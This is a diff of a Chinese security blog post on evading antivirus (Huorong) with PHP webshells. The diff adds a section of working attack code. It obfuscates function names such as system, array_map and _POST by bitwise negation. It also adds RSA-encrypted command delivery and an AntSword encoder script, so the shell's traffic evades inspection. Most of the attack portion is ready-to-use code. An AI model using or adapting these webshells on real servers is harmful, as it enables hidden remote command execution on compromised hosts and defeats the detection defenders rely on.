@@ -9,7 +9,7 @@
   
   <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_a0oqhord1y';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';</script>
   <title>
-    WebShell 免杀之字符串运算 + 动态调用 | 雾島风起時
+    PHP WebShell 免杀之字符串运算 + 动态调用 | 雾島风起時
   </title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
@@ -17,20 +17,22 @@
     
 <link rel="stylesheet" href="/css/loader.css">
 
-    <meta name="description" content="WebShell 免杀之字符串运算 + 动态调用前言以火绒为例，如果直接传入一句话木马包被识别的 例如下面我刚写完保存就给我删了  我们要从杀软的角度去思考，毕竟杀软也是圈内安全人士开发的 识别木马最简单的方法就是读取文件内容识别关键字如 eval、assert 等等 当然也还有结构特征，例如 @eval($_GET[&quot;code&quot;]) 等等 以上是静态的，当然还有动态的，只不过">
+    <meta name="description" content="PHP WebShell 免杀之字符串运算 + 动态调用前言以火绒为例，如果直接传入一句话木马包被识别的 例如下面我刚写完保存就给我删了  我们要从杀软的角度去思考，毕竟杀软也是圈内安全人士开发的 识别木马最简单的方法就是读取文件内容识别关键字如 eval、assert 等等 当然也还有结构特征，例如 @eval($_GET[&quot;code&quot;]) 等等 以上是静态的，当然还有动态的">
 <meta property="og:type" content="article">
-<meta property="og:title" content="WebShell 免杀之字符串运算 + 动态调用">
+<meta property="og:title" content="PHP WebShell 免杀之字符串运算 + 动态调用">
 <meta property="og:url" content="http://example.com/2026/04/29/WebShell%20%E5%85%8D%E6%9D%80%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%90%E7%AE%97%20+%20%E5%8A%A8%E6%80%81%E8%B0%83%E7%94%A8/index.html">
 <meta property="og:site_name" content="雾島风起時">
-<meta property="og:description" content="WebShell 免杀之字符串运算 + 动态调用前言以火绒为例，如果直接传入一句话木马包被识别的 例如下面我刚写完保存就给我删了  我们要从杀软的角度去思考，毕竟杀软也是圈内安全人士开发的 识别木马最简单的方法就是读取文件内容识别关键字如 eval、assert 等等 当然也还有结构特征，例如 @eval($_GET[&quot;code&quot;]) 等等 以上是静态的，当然还有动态的，只不过">
+<meta property="og:description" content="PHP WebShell 免杀之字符串运算 + 动态调用前言以火绒为例，如果直接传入一句话木马包被识别的 例如下面我刚写完保存就给我删了  我们要从杀软的角度去思考，毕竟杀软也是圈内安全人士开发的 识别木马最简单的方法就是读取文件内容识别关键字如 eval、assert 等等 当然也还有结构特征，例如 @eval($_GET[&quot;code&quot;]) 等等 以上是静态的，当然还有动态的">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://pic1.imgdb.cn/item/69f13e1686dda55bd7338b8e.png">
 <meta property="og:image" content="https://pic1.imgdb.cn/item/69f13c3386dda55bd7338b8d.png">
 <meta property="og:image" content="https://pic1.imgdb.cn/item/69f1430386dda55bd7338bbd.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6a0f4e362cb0eba86fb481bf.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6a0f4ee32cb0eba86fb481c1.png">
 <meta property="article:published_time" content="2026-04-28T23:00:00.000Z">
-<meta property="article:modified_time" content="2026-04-28T23:36:32.285Z">
+<meta property="article:modified_time" content="2026-05-21T18:28:56.774Z">
 <meta property="article:author" content="ALL">
-<meta property="article:tag" content="WebShell 免杀">
+<meta property="article:tag" content="PHP WebShell 免杀">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://pic1.imgdb.cn/item/69f13e1686dda55bd7338b8e.png">
     <link rel="alternate" href="/atom.xml" title="雾島风起時" type="application/atom+xml">
@@ -131,11 +133,11 @@
 <header id="header" aria-label="Site header">
         <picture>
         </picture>
-          <img  fetchpriority="high" src="/images/banner.webp" alt="WebShell 免杀之字符串运算 + 动态调用">
+          <img  fetchpriority="high" src="/images/banner.webp" alt="PHP WebShell 免杀之字符串运算 + 动态调用">
   <div id="header-outer">
     <div id="header-title">
           <span id="logo">
-            <h1 data-aos="slide-up">WebShell 免杀之字符串运算 + 动态调用</h1>
+            <h1 data-aos="slide-up">PHP WebShell 免杀之字符串运算 + 动态调用</h1>
           </span>
         <h2 id="subtitle-wrap" data-aos="slide-down">
         </h2>
@@ -150,7 +152,7 @@
     <div class="sidebar-wrap" data-aos="fade-up">
           <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WebShell-%E5%85%8D%E6%9D%80%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%90%E7%AE%97-%E5%8A%A8%E6%80%81%E8%B0%83%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">WebShell 免杀之字符串运算 + 动态调用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.</span> <span class="toc-text">思路</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP-WebShell-%E5%85%8D%E6%9D%80%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%90%E7%AE%97-%E5%8A%A8%E6%80%81%E8%B0%83%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">PHP WebShell 免杀之字符串运算 + 动态调用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-number">1.3.</span> <span class="toc-text">实战</span></a></li></ol></li></ol>
 </div>
 </div>
           <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -228,7 +230,7 @@
       <div class="article-date">
   <span class="article-date-link icon-calendar" data-aos="zoom-in">
     <time datetime="2026-04-28T23:00:00.000Z" itemprop="datePublished">2026-04-29</time>
-    <time style="display: none;" id="post-update-time">2026-04-29</time>
+    <time style="display: none;" id="post-update-time">2026-05-22</time>
   </span>
 </div>
 
@@ -237,7 +239,7 @@
     <div class="hr-line"></div>
     
     <div class="e-content article-entry" itemprop="articleBody">
-        <h1 id="WebShell-免杀之字符串运算-动态调用"><a href="#WebShell-免杀之字符串运算-动态调用" class="headerlink" title="WebShell 免杀之字符串运算 + 动态调用"></a>WebShell 免杀之字符串运算 + 动态调用</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>以火绒为例，如果直接传入一句话木马包被识别的</p>
+        <h1 id="PHP-WebShell-免杀之字符串运算-动态调用"><a href="#PHP-WebShell-免杀之字符串运算-动态调用" class="headerlink" title="PHP WebShell 免杀之字符串运算 + 动态调用"></a>PHP WebShell 免杀之字符串运算 + 动态调用</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>以火绒为例，如果直接传入一句话木马包被识别的</p>
 <p>例如下面我刚写完保存就给我删了</p>
 <p><img src="https://pic1.imgdb.cn/item/69f13e1686dda55bd7338b8e.png"></p>
 <p>我们要从杀软的角度去思考，毕竟杀软也是圈内安全人士开发的</p>
@@ -271,14 +273,22 @@
 <p>完整 Payload 如下：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span> = ~(</span><br><span class="line">    <span class="string">&quot;\x9E\x8D\x8D&quot;</span> .</span><br><span class="line">    <span class="string">&quot;\x9E\x86\xA0&quot;</span> .</span><br><span class="line">    <span class="string">&quot;\x92\x9E\x8F&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$__</span> = ~(</span><br><span class="line">    <span class="string">&quot;\x8C\x86\x8C&quot;</span> .</span><br><span class="line">    <span class="string">&quot;\x8B\x9A\x92&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$___</span> = ~(</span><br><span class="line">    <span class="string">&quot;\xA0&quot;</span> .</span><br><span class="line">    <span class="string">&quot;\xAF\xB0&quot;</span> .</span><br><span class="line">    <span class="string">&quot;\xAC\xAB&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$____</span> = ~(</span><br><span class="line">    <span class="string">&quot;\x9C&quot;</span> .</span><br><span class="line">    <span class="string">&quot;\x92\x9B&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$__</span>, [$&#123;<span class="variable">$___</span>&#125;[<span class="variable">$____</span>]]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>实战效果</p>
-<p><img src="https://pic1.imgdb.cn/item/69f13c3386dda55bd7338b8d.png"><br><img src="https://pic1.imgdb.cn/item/69f1430386dda55bd7338bbd.png"></p>
+<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p><img src="https://pic1.imgdb.cn/item/69f13c3386dda55bd7338b8d.png"><br><img src="https://pic1.imgdb.cn/item/69f1430386dda55bd7338bbd.png"></p>
+<p>使用蚁剑 RSA 加密效果如下：</p>
+<p><img src="https://pic1.imgdb.cn/item/6a0f4e362cb0eba86fb481bf.png"></p>
+<p>这是编码器源码：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="function">(<span class="params">pwd, data, ext = &#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> rawPayload = data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">    <span class="keyword">const</span> n = <span class="title class_">Math</span>.<span class="title function_">ceil</span>(rawPayload.<span class="property">length</span> / <span class="number">80</span>);</span><br><span class="line">    <span class="keyword">const</span> blockLen = <span class="title class_">Math</span>.<span class="title function_">ceil</span>(rawPayload.<span class="property">length</span> / n);</span><br><span class="line">    <span class="keyword">const</span> blocks = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> block = rawPayload.<span class="title function_">substr</span>(i * blockLen, blockLen);</span><br><span class="line">        <span class="comment">// 使用私钥加密，输出 Base64</span></span><br><span class="line">        blocks.<span class="title function_">push</span>(ext[<span class="string">&#x27;rsa&#x27;</span>].<span class="title function_">encryptPrivate</span>(block, <span class="string">&#x27;base64&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data[pwd] = blocks.<span class="title function_">join</span>(<span class="string">&#x27;|&#x27;</span>);</span><br><span class="line">    <span class="keyword">delete</span> data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这是最后含有加密的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ===== 原有混淆：array_map, system, _POST, cmd =====</span></span><br><span class="line"><span class="variable">$_</span> = ~(<span class="string">&quot;\x9E\x8D\x8D&quot;</span>.<span class="string">&quot;\x9E\x86\xA0&quot;</span>.<span class="string">&quot;\x92\x9E\x8F&quot;</span>);            <span class="comment">// array_map</span></span><br><span class="line"><span class="variable">$__</span> = ~(<span class="string">&quot;\x8C\x86\x8C&quot;</span>.<span class="string">&quot;\x8B\x9A\x92&quot;</span>);                          <span class="comment">// system</span></span><br><span class="line"><span class="variable">$___</span> = ~(<span class="string">&quot;\xA0&quot;</span>.<span class="string">&quot;\xAF\xB0&quot;</span>.<span class="string">&quot;\xAC\xAB&quot;</span>);                          <span class="comment">// _POST</span></span><br><span class="line"><span class="variable">$____</span> = ~(<span class="string">&quot;\x9C&quot;</span>.<span class="string">&quot;\x92\x9B&quot;</span>);                                    <span class="comment">// cmd</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ===== 新增：RSA 解密相关函数名字符串取反 =====</span></span><br><span class="line"><span class="variable">$_pkf</span>   = ~(<span class="string">&quot;\x90\x91\x8D\x9A\x93\x8C\x8C\x9C\x97\x9E\x8A\x9F\x9A\x8C\x9E\x8D\x9F\x96\x9B\x8F\x9E\x8C&quot;</span>); <span class="comment">// openssl_pkey_get_public</span></span><br><span class="line"><span class="variable">$_decf</span>  = ~(<span class="string">&quot;\x90\x91\x8D\x9A\x93\x8C\x8C\x9C\x91\x96\x9B\x8F\x9E\x8C\x9B\x8D\x9A\x8B\x9C\x8A\x8D&quot;</span>);   <span class="comment">// openssl_public_decrypt</span></span><br><span class="line"><span class="variable">$_b64</span>   = ~(<span class="string">&quot;\x8C\x9E\x8C\x8D\x9E\x9B\x9C\x8B\x9A\x9B\x90\x9A\x8D&quot;</span>);                                  <span class="comment">// base64_decode</span></span><br><span class="line"><span class="variable">$_exp</span>   = ~(<span class="string">&quot;\x9A\x87\x91\x8F\x90\x8B\x9A&quot;</span>);                                                          <span class="comment">// explode</span></span><br><span class="line"><span class="variable">$_sep</span>   = ~(<span class="string">&quot;\x83&quot;</span>);                                                                                   <span class="comment">// |</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ===== 公钥明文（无需取反） =====</span></span><br><span class="line"><span class="variable">$pubkey</span> = <span class="string">&quot;-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCLpefN/JHlJ9emUYAQ4cslKjYz</span></span><br><span class="line"><span class="string">qiWvtnwMcNtI4a0QIXirSYGPkcKarufzc66MMaEUS2pcW6OeufL6/008txLw+tvD</span></span><br><span class="line"><span class="string">gwLQoK+x1CL3TgXMfanULfWuKz9ZYq85RG1NpK/Nh/874HlqEfU41px5Oww5SZ/o</span></span><br><span class="line"><span class="string">YaZSJ2b+6gXYP0mYNQIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ===== 获取加密载荷 =====</span></span><br><span class="line"><span class="variable">$enc_cmd</span> = @$&#123;<span class="variable">$___</span>&#125;[<span class="variable">$____</span>];                     <span class="comment">// $_POST[&#x27;cmd&#x27;]</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$enc_cmd</span>)) &#123;</span><br><span class="line">    <span class="comment">// 分割密文块</span></span><br><span class="line">    <span class="variable">$blocks</span> = <span class="variable">$_exp</span>(<span class="variable">$_sep</span>, <span class="variable">$enc_cmd</span>);           <span class="comment">// explode(&#x27;|&#x27;, ...)</span></span><br><span class="line">    <span class="comment">// 加载公钥</span></span><br><span class="line">    <span class="variable">$pk</span> = <span class="variable">$_pkf</span>(<span class="variable">$pubkey</span>);                       <span class="comment">// openssl_pkey_get_public(...)</span></span><br><span class="line">    <span class="variable">$cmd</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="comment">// 逐块解密拼接</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blocks</span> <span class="keyword">as</span> <span class="variable">$block</span>) &#123;</span><br><span class="line">        <span class="variable">$decoded</span> = <span class="variable">$_b64</span>(<span class="variable">$block</span>);               <span class="comment">// base64_decode</span></span><br><span class="line">        <span class="variable">$de</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_decf</span>(<span class="variable">$decoded</span>, <span class="variable">$de</span>, <span class="variable">$pk</span>)) &#123;       <span class="comment">// openssl_public_decrypt</span></span><br><span class="line">            <span class="variable">$cmd</span> .= <span class="variable">$de</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 仍使用原马方式执行系统命令</span></span><br><span class="line">    <span class="variable">$_</span>(<span class="variable">$__</span>, [<span class="variable">$cmd</span>]);                            <span class="comment">// array_map(&quot;system&quot;, [$cmd])</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic1.imgdb.cn/item/6a0f4ee32cb0eba86fb481c1.png"></p>
 
     </div>
     <footer class="article-footer">
         <a class="article-category-link" href="/categories/%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80/" title="远控免杀" data-aos="zoom-in">远控免杀</a>
 
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/WebShell-%E5%85%8D%E6%9D%80/" rel="tag" title="WebShell 免杀">WebShell 免杀</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/PHP-WebShell-%E5%85%8D%E6%9D%80/" rel="tag" title="PHP WebShell 免杀">PHP WebShell 免杀</a></li></ul>
 
     </footer>
   </div>
@@ -323,10 +333,10 @@
       </div>
       <div>
         <span class="icon-brush"></span>
-        83.3k
+        85.5k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        06:58
+        07:09
       </div>
       <div>
         <span class="icon-eye"></span>
@@ -348,7 +358,7 @@
   <div class="sidebar-wrap">
         <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WebShell-%E5%85%8D%E6%9D%80%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%90%E7%AE%97-%E5%8A%A8%E6%80%81%E8%B0%83%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">WebShell 免杀之字符串运算 + 动态调用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.</span> <span class="toc-text">思路</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP-WebShell-%E5%85%8D%E6%9D%80%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%90%E7%AE%97-%E5%8A%A8%E6%80%81%E8%B0%83%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">PHP WebShell 免杀之字符串运算 + 动态调用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-number">1.3.</span> <span class="toc-text">实战</span></a></li></ol></li></ol>
 </div>
 </div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -476,13 +486,13 @@
       <script data-pjax>
         window.REIMU_POST = {
           author: "ALL",
-          title: "WebShell 免杀之字符串运算 + 动态调用",
+          title: "PHP WebShell 免杀之字符串运算 + 动态调用",
           url: "http://example.com/2026/04/29/WebShell%20%E5%85%8D%E6%9D%80%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%90%E7%AE%97%20+%20%E5%8A%A8%E6%80%81%E8%B0%83%E7%94%A8/",
           excerpt: "",
           description: "",
-          stripContent: "WebShell 免杀之字符串运算 + 动态调用前言以火绒为例，如果直接传入一句话木马包被识别的 例如下面我刚写完保存就给我删了  我们要从杀软的角度去思考，毕竟杀软也是圈内安全人士开发的 识别木马最简单的方法就是读取文件内容识别关键字如 eval、assert 等等 当然也还有结构特征，例如 @eval($_GET[&amp;quot;code&amp;quot;]) 等等 以上是静态的，当然还有动态的，只不过这个根据杀软的强度来的，只要静态过了，动态大概率会过 WebShell 的动态不像 C2 木马那样容",
+          stripContent: "PHP WebShell 免杀之字符串运算 + 动态调用前言以火绒为例，如果直接传入一句话木马包被识别的 例如下面我刚写完保存就给我删了  我们要从杀软的角度去思考，毕竟杀软也是圈内安全人士开发的 识别木马最简单的方法就是读取文件内容识别关键字如 eval、assert 等等 当然也还有结构特征，例如 @eval($_GET[&amp;quot;code&amp;quot;]) 等等 以上是静态的，当然还有动态的，只不过这个根据杀软的强度来的，只要静态过了，动态大概率会过 WebShell 的动态不像 C2 木",
           date: "Wed Apr 29 2026 07:00:00 GMT+0800",
-          updated: "Wed Apr 29 2026 07:36:32 GMT+0800",
+          updated: "Fri May 22 2026 02:28:56 GMT+0800",
           cover: "/images/banner.webp",
         };
       </script>
